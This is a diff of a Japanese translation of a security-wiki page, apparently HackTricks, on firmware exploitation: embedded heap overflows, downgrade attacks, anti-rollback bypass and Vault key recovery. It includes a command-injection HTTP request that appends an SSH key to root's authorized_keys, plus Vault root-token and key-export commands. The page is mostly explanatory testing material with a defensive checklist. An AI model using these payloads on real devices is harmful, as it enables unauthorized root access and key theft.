-- **expected offset** と、より大きな `chunk_len` を持つ後続 fragment を送る。
-- fresh checks を満たしながら、元々 allocated された buffer を overflow させる forged packet-local size を送る。
+- 宣言するtotal sizeを**小さく**した有効なfirst fragmentを送り、小さなheap allocationを強制する。
+- **expected offset**を保ちつつ、より大きな`chunk_len`を持つ後続fragmentを送る。
+- fresh checkを満たしながら、最初に割り当てられたbufferをoverflowさせる、偽装したpacket-local sizeを指定する。
 
-vulnerable path が commissioning logic の背後にある場合、malformed fragments を送信する前に、target を想定された model-download または blob-download state に移行させるため、十分な **device emulation** を exploit に含める必要があります。
+vulnerable pathがcommissioning logicの背後にある場合、不正なfragmentを送る前に、対象を想定されるmodel-downloadまたはblob-download stateへ移行させるための**device emulation**が必要です。
 
-### Protocol-driven `free()` triggers
+### Protocol-driven `free()` trigger
 
-Embedded daemons では、heap metadata exploitation を trigger する最も簡単な方法は、多くの場合「cleanup を待つ」ことではなく、**protocol 自身の error handling を強制する**ことです:<sup>[[8]](#references)</sup>
+Embedded daemonでは、heap metadata exploitationを引き起こす最も簡単な方法は、「cleanupを待つ」ことではなく、**protocol自身のerror handlingを強制する**ことです。<sup>[[8]](#references)</sup>
 
-- malformed follow-up fragments を送り、FSM を **retry** または **error** states に移行させます。
-- retry threshold を超過させ、daemon に **reset context** と corrupted buffer の free を実行させます。
-- この predictable な `free()` を使用して、process が無関係な理由で crash する前に allocator-side primitives を trigger します。
+- 不正なfollow-up fragmentを送り、FSMを**retry**または**error** stateに移行させる。
+- retry thresholdを超えさせ、daemonに**contextをreset**させて破損したbufferをfreeさせる。
+- 予測可能なこの`free()`を利用して、無関係な原因でprocessがcrashする前にallocator-side primitiveを発動させる。
 
-これは、embedded Linux の **musl/uClibc/dlmalloc-like** allocators に対して特に有用です。chunk metadata の corruption により、unlink/unbin logic を write primitive に変えられる可能性があるためです。安定した pattern は、real bin pointers を直ちに clobber して process を crash させるのではなく、**size field** を corruption して、overflow された buffer 内に配置した **fake chunks** へ allocator traversal を redirect することです。
+これは、特にembedded Linuxの**musl/uClibc/dlmalloc系**allocatorに有効です。chunk metadataの破損によって、unlink/unbin logicをwrite primitiveに変えられる場合があります。安定した手法は、real bin pointerをすぐに上書きしてprocessをcrashさせるのではなく、**size field**を破損させ、allocator traversalをoverflowしたbuffer内に配置した**fake chunk**へ誘導することです。
 
-## Binary Exploitation and Proof-of-Concept
+## Binary ExploitationとProof-of-Concept
 
-特定された vulnerabilities の PoC を開発するには、target architecture と lower-level languages による programming を深く理解する必要があります。Embedded systems では binary runtime protections はまれですが、存在する場合は Return Oriented Programming (ROP) などの techniques が必要になることがあります。
+特定したvulnerabilityのPoCを開発するには、target architectureへの深い理解と、低レベル言語でのprogrammingが必要です。Embedded systemではbinary runtime protectionはまれですが、存在する場合はReturn Oriented Programming (ROP)などのtechniqueが必要になることがあります。
 
-### uClibc fastbin exploitation notes (embedded Linux)
+### uClibc fastbin exploitationの注意点（embedded Linux）
 
-- **Fastbins + consolidation:** uClibc は glibc に似た fastbins を使用します。後続の large allocation によって `__malloc_consolidate()` が trigger される可能性があるため、fake chunk は checks (sane size、`fd = 0`、および surrounding chunks が "in use" と認識されること) を通過できなければなりません。<sup>[[6]](#references)</sup>
-- **Non-PIE binaries under ASLR:** ASLR が有効でも main binary が **non-PIE** であれば、in-binary `.data/.bss` addresses は stable です。既に valid heap chunk header に似ている region を target にして、fastbin allocation を **function pointer table** 上に配置できます。
-- **Parser-stopping NUL:** JSON が parsed される場合、payload 内の `\x00` によって parsing を停止させつつ、stack pivot/ROP chain 用の attacker-controlled bytes を後続に保持できます。
-- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`、`lseek()`、`write()` を call する ROP chain により、known mapping 内に executable shellcode を配置して、そこへ jump できます。
+- **Fastbinとconsolidation:** uClibcはglibcと同様のfastbinを使用します。後続のlarge allocationで`__malloc_consolidate()`が呼ばれる場合があるため、fake chunkはcheck（妥当なsize、`fd = 0`、周囲のchunkが"in use"と認識されること）を通過する必要があります。<sup>[[6]](#references)</sup>
+- **ASLR下のnon-PIE binary:** ASLRが有効でも、メインbinaryが**non-PIE**なら、binary内の`.data/.bss` addressは安定しています。有効なheap chunk headerに似たregionをtargetにすれば、fastbin allocationを**function pointer table**上に配置できます。
+- **parserを停止させるNUL:** JSONのparse時にpayload内の`\x00`があると、後続のattacker-controlled byteをstack pivot/ROP chain用に残したまま、parseを停止させられる場合があります。
+- **`/proc/self/mem`経由のshellcode:** `open("/proc/self/mem")`、`lseek()`、`write()`を呼び出すROP chainで、既知のmappingに実行可能なshellcodeを配置してjumpできます。
 
-## Firmware Analysis 用の Prepared Operating Systems
+## Firmware Analysis向けのPrepared Operating System
 
-[AttifyOS](https://github.com/adi0x90/attifyos) や [EmbedOS](https://github.com/scriptingxss/EmbedOS) のような operating systems は、firmware security testing 用の pre-configured environments を提供し、必要な tools を備えています。
+[AttifyOS](https://github.com/adi0x90/attifyos)や[EmbedOS](https://github.com/scriptingxss/EmbedOS)などのoperating systemは、firmware security testingに必要なtoolを備えた、事前設定済みの環境を提供します。
 
-## Firmware を analyze するための Prepared OSs
+## Firmware Analysis用のPrepared OS
 
-- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS は、Internet of Things (IoT) devices の security assessment と penetration testing を実行するための distro です。必要な tools がすべて loaded された pre-configured environment を提供することで、多くの時間を節約します。
-- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing tools が preloaded された、Ubuntu 18.04 based の embedded security testing operating system です。
+- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOSは、Internet of Things (IoT) deviceのsecurity assessmentとpenetration testingを支援するためのdistroです。必要なtoolがすべて読み込まれた事前設定済みの環境を提供し、多くの時間を節約できます。
+- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing toolが事前にインストールされた、Ubuntu 18.04ベースのembedded security testing operating systemです。
 
-## Firmware Downgrade Attacks & Insecure Update Mechanisms
+## Firmware Downgrade Attackと安全でないUpdate Mechanism
 
-vendor が firmware images に対する cryptographic signature checks を実装している場合でも、**version rollback (downgrade) protection は頻繁に省略されます**。boot- または recovery-loader が embedded public key による signature のみを verify し、flash される image の *version* (または monotonic counter) を比較しない場合、attacker は **有効な signature が付いた古い vulnerable firmware** を正当に install できます。これにより、patch 済み vulnerabilities が再導入されます。<sup>[[4]](#references)</sup>
+vendorがfirmware imageのcryptographic signature checkを実装していても、**version rollback（downgrade）protectionは省略されていることがよくあります**。bootまたはrecovery loaderが、埋め込まれたpublic keyでsignatureを検証するだけで、書き込むimageの*version*（またはmonotonic counter）を比較しない場合、攻撃者は**有効なsignatureが付いた古いvulnerable firmware**を正規の手順でインストールし、修正済みのvulnerabilityを再び利用可能にできます。<sup>[[4]](#references)</sup>
 
-Typical attack workflow:
+典型的なattack workflow:
 
-1. **Obtain an older signed image**
-* vendor の public download portal、CDN、または support site から取得します。
-* companion mobile/desktop applications から extract します (例: Android APK 内の `assets/firmware/`)。
-* VirusTotal、Internet archives、forums などの third-party repositories から retrieve します。
-2. exposed update channel 経由で **Upload or serve the image to the device**:
-* Web UI、mobile-app API、USB、TFTP、MQTT など。
-* 多くの consumer IoT devices は、Base64-encoded firmware blobs を受け付け、server-side で decode して recovery/upgrade を trigger する *unauthenticated* HTTP(S) endpoints を expose しています。
-3. downgrade 後、新しい release で patch された vulnerability (例: 後から追加された command-injection filter) を exploit します。
-4. persistence を獲得した後、検出を避けるため、必要に応じて latest image を flash し直すか、updates を disable します。
+1. **古い署名済みimageを入手する**
+   * vendorの公開download portal、CDN、またはsupport siteから取得する。
+   * companion mobile/desktop applicationから抽出する（例: Android APK内の`assets/firmware/`）。
+   * VirusTotal、Internet archive、forumなどのthird-party repositoryから取得する。
+2. 公開されているupdate channelを使って、imageをdeviceに**uploadするか配信する**。
+   * Web UI、mobile-app API、USB、TFTP、MQTTなど。
+   * 多くのconsumer IoT deviceは、Base64 encodeされたfirmware blobを受け付け、server側でdecodeしてrecovery/upgradeを開始する、*認証不要*のHTTP(S) endpointを公開しています。
+3. downgrade後、新しいreleaseで修正されたvulnerabilityをexploitする（例: 後のversionで追加されたcommand-injection filter）。
+4. 任意で、persistenceを得た後に最新imageを書き戻すか、検知を避けるためupdateを無効化する。
 
-### Example: Command Injection After Downgrade
+### 例: Downgrade後のCommand Injection
+
 ```http
 POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
 Host: 192.168.0.1
 Content-Type: application/octet-stream
 Content-Length: 0
 ```
-脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメータがサニタイズなしでシェルコマンドに直接連結されるため、任意のコマンドをインジェクションできます（ここでは、SSH の鍵ベースによる root アクセスを有効化）。後のファームウェアバージョンでは基本的な文字フィルターが導入されましたが、ダウングレード保護が存在しないため、この修正は実質的に無効です。<sup>[[4]](#references)</sup>
 
-### Mobile Apps からのファームウェアの抽出
+脆弱な（ダウングレードされた）firmwareでは、`md5`パラメータがサニタイズされずにshell commandへ直接連結されるため、任意のコマンドを注入できます（ここでは、SSH key-basedのroot accessを有効化しています）。後のfirmwareバージョンでは基本的な文字フィルターが導入されましたが、ダウングレード保護がないため、この修正は無意味です。<sup>[[4]](#references)</sup>
 
-多くのベンダーは、アプリから Bluetooth/Wi-Fi 経由でデバイスを更新できるよう、完全なファームウェアイメージをコンパニオンモバイルアプリケーション内にバンドルしています。これらのパッケージは通常、APK/APEX 内の `assets/fw/` や `res/raw/` などのパスに暗号化されていない状態で保存されています。`apktool`、`ghidra`、あるいは単純な `unzip` などのツールを使えば、物理ハードウェアに触れることなく署名済みイメージを取り出せます。<sup>[[4]](#references)</sup>
+### モバイルアプリからのFirmware抽出
+
+多くのベンダーは、アプリからBluetooth/Wi-Fi経由でデバイスを更新できるよう、companion mobile applicationに完全なfirmwareイメージを同梱しています。これらのパッケージは、`assets/fw/`や`res/raw/`などのパスにあるAPK/APEX内に、暗号化されずに保存されていることがよくあります。`apktool`、`ghidra`、あるいは単純な`unzip`などのツールを使えば、物理ハードウェアに触れることなく、署名済みイメージを取り出せます。<sup>[[4]](#references)</sup>
+
 ```
 $ apktool d vendor-app.apk -o vendor-app
 $ ls vendor-app/assets/firmware
 firmware_v1.3.11.490_signed.bin
 ```
-### A/B slot設計におけるupdater限定のanti-rollback bypass
 
-一部のvendorはanti-downgrade **ratchet**を実装していますが、それを*updater*ロジック内だけに限定しています（たとえばCAN経由のUDS routine、recovery command、userspace OTA agentなど）。後から**bootloader**がimage signature/CRCだけをチェックし、partition tableまたはslot metadataを信頼する場合、rollback protectionは依然としてbypass可能です。<sup>[[7]](#references)</sup>
+### A/B slot設計におけるupdaterのみのanti-rollback bypass
 
-典型的な脆弱な設計:
+一部のvendorはanti-downgrade **ratchet**を実装していますが、その適用範囲は*updater*のロジック内に限られます（例: CAN経由のUDS routine、recovery command、userspace OTA agent）。その後、**bootloader**がイメージのsignature/CRCだけをチェックし、partition tableやslot metadataを信頼する場合、rollback protectionは依然としてbypassできます。<sup>[[7]](#references)</sup>
 
-- Firmware metadataにversion descriptorと**security ratchet** / monotonic counterの両方が含まれている。
-- updaterはimage ratchetをpersistent storageに保存された値と比較し、より古いsigned imageを拒否する。
-- bootloaderはそのratchetを**parse**せず、選択されたslotをbootする前にheader、CRC、signatureのみを検証する。
-- Slot activationはpartition tableまたはper-slot generation counterに別々に保存され、検証済みの正確なfirmware digestに対して**cryptographically bound**されていない。
+典型的な脆弱設計:
 
-これにより、dual-slot systemで**validate-one-image / boot-another-image** primitiveが成立します。攻撃者が、current signed imageを使ってupdaterにslot Bを次のboot targetとして設定させ、その後reboot前にslot Bをoverwriteできる場合、bootloaderはすでにcommitされたslot metadataだけを信頼するため、downgraded imageをbootする可能性があります。
+- Firmware metadataに、version descriptorと**security ratchet** / monotonic counterの両方が含まれている。
+- Updaterは、イメージのratchetをpersistent storageに保存された値と比較し、古いsigned imageを拒否する。
+- Bootloaderはそのratchetを**解析せず**、選択されたslotを起動する前にheader、CRC、signatureだけを検証する。
+- Slotの有効化情報はpartition tableまたはslotごとのgeneration counterに別途保存され、検証済みの正確なfirmware digestには**暗号学的に結び付けられていない**。
 
-一般的なabuse pattern:
+これにより、dual-slot systemで**あるイメージを検証し、別のイメージを起動する**primitiveが成立します。攻撃者が、現在のsigned imageを使ってupdaterにslot Bを次回のboot targetとして指定させ、その後reboot前にslot Bを上書きできる場合、bootloaderはすでにcommitされたslot metadataしか信頼しないため、downgradeされたイメージを起動する可能性があります。
 
-1. **current signed** firmwareをpassive slotにuploadし、通常のvalidation/switch routineを実行して、そのslotが次のactive slotになるようlayoutに記録させる。
-2. **まだrebootしない**。同じsessionでslot-preparation/erase routineに再入する。
-3. stale stateに基づいてslotをeraseし、**current committed layout**を参照しないような、stale boot-stateまたはstale slot-selection logicを悪用する。
-4. **older but still signed** firmwareをそのslotにwriteする。
-5. ratchetを強制するvalidation routineをskipし、直接rebootする。
-6. bootloaderはpromoteされたslotを選択し、signature/integrityだけを検証してold imageをbootする。
+よくある悪用パターン:
 
-A/B update implementationをreverseする際に確認すべき点:
+1. **現行のsigned** firmwareをpassive slotにuploadし、通常のvalidation/switch routineを実行して、そのslotが次のactive slotとしてlayoutに記録されるようにする。
+2. **まだrebootしない**。同じsession内でslot-preparation/erase routineを再度実行する。
+3. 古いboot-stateまたはslot-selectionロジックを悪用し、updaterに、直前に昇格したものと**同じ物理slot**をeraseさせる。
+4. **古いがsignedのままの** firmwareをそのslotに書き込む。
+5. ratchetを強制するvalidation routineをスキップし、直接rebootする。
+6. Bootloaderは昇格済みのslotを選択し、signature/integrityだけを検証して、古いイメージを起動する。
 
-- 成功したswitch後にrefreshされない**boot-time flags**からslot selectionが導出されている。
-- **current committed layout**ではなくstale stateに基づいてslotをeraseする`prepare_passive_slot()`形式のroutine。
-- **generation counter** / active flagだけをincrementし、検証済みimage hashを保存しない`part_write_layout()`形式のfunction。
-- ratchet checkがuserspaceまたはupdater codeに実装されているが、ROM / bootloader / secure boot stageには実装されていない。
-- Eraseまたはrecovery routineが、slotのcontentをremoveしてrewriteした後も、そのslotをbootableとしてmarkしたままにする。
+A/B update実装をreverse engineeringする際に確認する点:
 
-### Update Logicを評価するためのChecklist
+- Slot選択が、switch成功後に更新されない**boot-time flags**から導出されている。
+- `prepare_passive_slot()`のようなroutineが、**現在commit済みのlayout**ではなく古いstateに基づいてslotをeraseする。
+- `part_write_layout()`のようなfunctionが、**generation counter** / active flagを更新するだけで、検証済みイメージのhashを保存しない。
+- Ratchet checkがuserspaceまたはupdaterのcodeに実装されている一方、ROM / bootloader / secure boot stageには**実装されていない**。
+- Eraseまたはrecovery routineが、内容を削除して書き換えた後も、そのslotをboot可能な状態として残す。
+
+### Update Logicの評価チェックリスト
 
 * *update endpoint*のtransport/authenticationは適切に保護されているか（TLS + authentication）？
-* Flashing前にdeviceは**version numbers**または**monotonic anti-rollback counter**を比較するか？
-* Imageはsecure boot chain内でverificationされるか（例: ROM codeがsignatureをcheckする）？
-* **bootloaderはupdaterと同じratchetをenforce**しているか、それともsignature/CRCだけをcheckしているか？
-* Slot activation metadataは**validated firmware digest/versionにbound**されているか、それともpromotion後にslotをmodifyできるか？
-* Slot switchが成功した後、deviceはrebootを強制されるか、それとも同じsessionで後続のupdate/erase routineに引き続きreachできるか？
-* Userland codeは追加のsanity checkを実行するか（例: allowed partition map、model number）？
-* *partial*または*backup* update flowは同じvalidation logicをreuseしているか？
+* Flash前に、deviceは**version number**または**monotonic anti-rollback counter**を比較するか？
+* イメージはsecure boot chain内で検証されるか（例: ROM codeによるsignature check）？
+* **bootloaderはupdaterと同じratchetを強制するか**、それともsignature/CRCだけをチェックするか？
+* Slot activation metadataは**検証済みfirmwareのdigest/versionに結び付けられているか**、それとも昇格後にslotを変更できるか？
+* Slot switch成功後、deviceは強制的にrebootするか、それとも同じsession内で後続のupdate/erase routineを実行できるか？
+* Userland codeは追加のsanity check（例: 許可されたpartition map、model number）を行うか？
+* *partial*または*backup* update flowは、同じvalidation logicを再利用しているか？
 
-> 💡  上記のいずれかが欠けている場合、そのplatformはrollback attackに対してvulnerableである可能性が高い。
+> 💡  上記のいずれかが欠けている場合、そのplatformはrollback attackに対して脆弱である可能性が高い。
 
-## Practice用のVulnerable firmware
+## 練習用の脆弱なfirmware
 
-Firmwareのvulnerability発見をpracticeするには、以下のvulnerable firmware projectをstarting pointとして使用します。
+Firmwareの脆弱性を見つける練習には、以下の脆弱なfirmware projectを出発点として利用してください。
 
 - OWASP IoTGoat
-- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
+  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
 - The Damn Vulnerable Router Firmware Project
-- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
+  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
 - Damn Vulnerable ARM Router (DVAR)
-- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
+  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
 - ARM-X
-- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
+  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
 - Azeria Labs VM 2.0
-- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
+  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
 - Damn Vulnerable IoT Device (DVID)
-- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)
+  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)
 
-## Embedded KMS/Vault stateからfirmware decryption keyをrecoverする
+## 組み込みKMS/Vault stateからのfirmware decryption keyの復元
 
-Update imageがsmall plaintext metadataとlarge high-entropy blobを混在させている場合、何かをbrute-forceする前にcontainer triageを行います:<sup>[[1]](#references)</sup>
+Update imageに少量のplaintext metadataと大容量の高エントロピーblobが混在している場合は、brute-forceを試す前にcontainerの初期調査を行います。<sup>[[1]](#references)</sup>
 
-- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使用してheaders、offsets、line boundariesをdumpする。
-- `Salted__`は通常OpenSSL `enc` formatを意味します。次の8 bytesがsaltで、残りのbytesがciphertextです。
-- `256` bytesに正確にdecodeされるBase64 fieldは、random firmware password/session keyをwrapするRSA-2048 ciphertextを見ている強いhintです。
-- 同じfile内のDetached PGP materialはauthenticityだけをprotectしていることが多く、それがconfidentiality mechanismだと想定しないでください。
+- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使って、header、offset、行境界をdumpする。
+- `Salted__`は通常、OpenSSL `enc`形式を示す。次の8 bytesがsaltで、残りがciphertext。
+- `256` bytesちょうどにdecodeされるBase64 fieldは、RSA-2048 ciphertextでランダムなfirmware password/session keyをwrapしている強い手掛かり。
+- 同じfile内のdetached PGP materialは、多くの場合authenticityだけを保護する。confidentialityの仕組みだと思い込まないこと。
 
-Static key hunting（`grep`、`strings`、PEM/PGP searches）が失敗した場合は、private keyだけをsearchするのではなく、**operational decrypt path**をreverseします:
+静的なkey探索（`grep`、`strings`、PEM/PGP検索）が失敗した場合は、private keyを探すだけでなく、**運用上のdecrypt path**をreverse engineeringします。
 
-- Updater / management binaryをdecompileし、encrypted blobをreadするcomponent、どのhelper/APIがそれをunwrapするか、requestするlogical key nameをtraceする。
-- Extractしたroot filesystemから、KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）とunit filesおよびinit scriptsをsearchする。
-- Plaintextの`vault operator unseal ...`、recovery keys、bootstrap tokens、またはlocal KMS auto-unseal scriptsは、private-key materialと同等に扱う。
+- Updater / management binaryをdecompileし、暗号化されたblobを読み込む処理、unwrapに使うhelper/API、要求するlogical key nameを追跡する。
+- 抽出したroot filesystemから、KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）に加えてunit fileやinit scriptを検索する。
+- Plaintextの`vault operator unseal ...`、recovery key、bootstrap token、またはローカルKMSのauto-unseal scriptは、private-key materialと同等に扱う。
 
-Applianceがoriginal Vault binaryとstorage backendをshipしている場合、Vault internalsをreimplementするよりも、そのenvironmentをreplayする方が通常は容易です:
+Applianceに元のVault binaryとstorage backendが含まれている場合、Vaultの内部機能を再実装するより、その環境を再現するほうが通常は簡単です:
+
 ```bash
 vault server -config=/tmp/vault.hcl
 vault operator unseal <share1>
@@ -517,27 +550,28 @@ vault operator generate-root -nonce="$NONCE" "<share2>"
 FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
 TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
 ```
-クローンした KMS 上で root を使用し、次の操作を行います。
 
-- transit key を分離したクローン内でのみ export 可能にする: `vault write transit/keys/<name>/config exportable=true`
-- unwrap key を export する: `vault read transit/export/encryption-key/<name>`
-- 復元した RSA key を、KMS が使用する正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 decrypt の失敗と、デフォルトの OAEP decrypt の失敗だけでは、key が間違っているとは証明できません。多くの Vault-backed flow では OAEP with SHA-256 が使用されますが、一般的な library のデフォルトは SHA-1 です。
-- payload が `Salted__` で始まる場合は、AES-CBC decryption を試す前に、vendor の OpenSSL KDF（`EVP_BytesToKey`、legacy appliance では MD5 がよく使われます）を正確に再現する。
+クローンした KMS で root 権限を使い、次の操作を行います。
 
-これにより、「encrypted firmware」はより一般的な問題になります。**appliance 側の operational key を復元し、その後、正確な unwrap + KDF parameter を offline で再現する**という問題です。
+- transit key をエクスポート可能にするのは、隔離されたクローン内だけにしてください: `vault write transit/keys/<name>/config exportable=true`
+- unwrap key をエクスポートします: `vault read transit/export/encryption-key/<name>`
+- 復元した RSA key を、KMS が使用する正確な padding/hash の組み合わせで試します。PKCS#1 v1.5 による復号や、デフォルトの OAEP による復号に失敗しても、key が間違っているとは限りません。Vault を使ったフローの多くは SHA-256 を使う OAEP ですが、一般的なライブラリのデフォルトは SHA-1 です。
+- payload が `Salted__` で始まる場合は、AES-CBC 復号を試す前に、ベンダーの OpenSSL KDF（レガシーな機器では多くの場合 MD5 を使う `EVP_BytesToKey`）を正確に再現します。
 
-## Training and Certifications
+これにより、「暗号化された firmware」の解析は、より汎用的な問題になります。**機器側の運用 key を復元し、正確な unwrap + KDF パラメーターをオフラインで再現します。**
+
+## トレーニングと認定資格
 
 - [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)
 
 ## References
 
-- [1] [Claude で firmware を crack する: Senior-Level Skill、Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
+- [1] [Claude による firmware の解析: シニアレベルのスキル、ジュニアレベルの自律性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
 - [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
-- [3] [Practical IoT Hacking: Internet of Things を攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
-- [4] [放棄された hardware の zero day を悪用する - Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
-- [5] [20 ドルの Smart Device で自宅への access を得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
+- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
+- [4] [放棄された hardware の zero-day を悪用する – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
+- [5] [20 ドルの smart device から、自宅へのアクセスを得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
 - [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
-- [7] [Synacktiv - charge port connector から Tesla Wall Connector を Exploiting - Part 2: anti-downgrade の bypass](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
+- [7] [Synacktiv - Tesla Wall Connector の充電ポートコネクターからの悪用 - Part 2: anti-downgrade の回避](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
 - [8] [Make it Blink: Philips Hue Bridge の Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
 {{#include ../../banners/hacktricks-training.md}}
